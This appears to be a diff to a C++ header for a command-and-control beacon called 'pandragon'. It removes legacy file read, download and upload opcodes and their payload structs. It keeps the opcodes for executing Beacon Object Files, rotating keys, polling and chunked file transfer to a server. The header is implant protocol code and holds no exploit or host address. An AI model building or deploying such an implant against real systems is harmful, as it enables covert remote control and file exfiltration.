@@ -9,9 +9,7 @@
 
 namespace pandragon {
         enum class networkFlags:uint32_t {
-        NETWORK_NO_FLAGS    = 0x00,
         NETWORK_NO_ENCRYPT  = 0x01,  // skip encryption layer (future use)
-        NETWORK_NO_COMPRESS = 0x02, // skip compression (future use)
     };
 }
 
@@ -181,17 +179,13 @@ namespace pandragon {
         NO_TASKS    = 0x00,
         ECHO        = 0x01,
         SLEEP       = 0x02,
-        FILE_READ   = 0x04,
         DIE         = 0xFF,
-        // Extended opcodes (legacy - single packet, for small files <4KB)
         BOF_EXEC      = 0x10,
         BOF_FREE      = 0x11,  // Free cached BOF by ID
         // Long-running async BOF commands
         // Payload: uint32_t task_id + uint8_t subcmd + [optional args]
         // Subcommands: 0=start, 1=abort, 2=update_args, 3=remove
         LONG_RUNNING_BOF = 0x14,
-        FILE_DOWNLOAD = 0x12,  // Legacy: read entire file in one packet
-        FILE_UPLOAD   = 0x13,  // Legacy: write entire file in one packet
         // Key rotation opcode
         ROTATE_KEY    = 0x1E,  // Rotate crypto key (server -> beacon)
         // Chunked file transfer opcodes (for large files)
@@ -216,9 +210,7 @@ namespace pandragon {
         BEACON_POLL            = 0x02,
         BEACON_TASK_RESULT     = 0x03,
         BEACON_ERROR           = 0x04,
-        // Extended opcodes (legacy - single packet)
-        FILE_CONTENT       = 0x10,  // Legacy: file read result (small files)
-        FILE_WRITE_RESULT  = 0x11,  // Legacy: file write confirmation
+        // Extended opcodes
         BOF_OUTPUT         = 0x12,
         LIST_FILES_RESULT  = 0x13,  // Directory listing result
         // Key rotation acknowledgment
@@ -303,32 +295,6 @@ namespace pandragon {
         uint16_t bof_len;
         uint32_t arg_len;
         // uint8_t bof_data[bof_len] + uint8_t args[arg_len] follow
-    };
-
-    // FILE_DOWNLOAD payload: uint16_t path_len + path[path_len]
-    struct payload_file_download {
-        uint16_t path_len;
-        // wchar_t path[path_len] follows
-    };
-
-    // FILE_UPLOAD payload: uint16_t path_len + uint32_t file_size + path[path_len] + data[file_size]
-    struct payload_file_upload {
-        uint16_t path_len;
-        uint32_t file_size;
-        // wchar_t path[path_len] + char data[file_size] follow
-    };
-
-    // FILE_CONTENT response: uint16_t path_len + uint32_t file_size + uint8_t status + path + data
-    struct payload_file_content {
-        uint16_t path_len;
-        uint32_t file_size;
-        uint8_t  status;  // 0=success, 1=error
-        // wchar_t path[path_len] + char data[file_size] follow
-    };
-    
-    // FILE_WRITE_RESULT response: uint8_t status
-    struct payload_file_write_result {
-        uint8_t status;  // 0=success, 1=error
     };
 
     // =============================================================================
@@ -417,10 +383,6 @@ namespace pandragon {
     static_assert(sizeof(packet_header) == 46, "packet_header must be 46 bytes (no padding)");
     static_assert(sizeof(payload_sleep) == 8, "payload_sleep must be 8 bytes (unpacked)");
     static_assert(sizeof(payload_bof_exec) == 6, "payload_bof_exec must be 6 bytes");
-    static_assert(sizeof(payload_file_download) == 2, "payload_file_download prefix must be 2 bytes");
-    static_assert(sizeof(payload_file_upload) == 6, "payload_file_upload prefix must be 6 bytes");
-    static_assert(sizeof(payload_file_content) == 7, "payload_file_content prefix must be 7 bytes");
-    static_assert(sizeof(payload_file_write_result) == 1, "payload_file_write_result must be 1 byte");
     static_assert(sizeof(payload_rotate_key) == 40, "payload_rotate_key must be 40 bytes");
     static_assert(sizeof(payload_key_rotate_ack) == 4, "payload_key_rotate_ack must be 4 bytes");
     static_assert(sizeof(payload_file_download_start) == 6, "payload_file_download_start prefix must be 6 bytes");
@@ -434,23 +396,6 @@ namespace pandragon {
     // =============================================================================
     // File Transfer Helper Functions
     // =============================================================================
-    
-    /**
-     * Send file content to server (FILE_CONTENT opcode - legacy, small files only)
-     * @param filePath      Wide string path to the file
-     * @param fileData      Pointer to file data buffer
-     * @param fileSize      Size of file data in bytes
-     * @param status        0=success, 1=error
-     * @return true on successful transmission
-     */
-    [[nodiscard]] bool sendFileContent(const wchar_t* filePath, const uint8_t* fileData, size_t fileSize, uint8_t status);
-    
-    /**
-     * Send file write result to server (FILE_WRITE_RESULT opcode - legacy)
-     * @param status  0=success, 1=error
-     * @return true on successful transmission
-     */
-    [[nodiscard]] bool sendFileWriteResult(uint8_t status);
     
     // Chunked file transfer functions
     
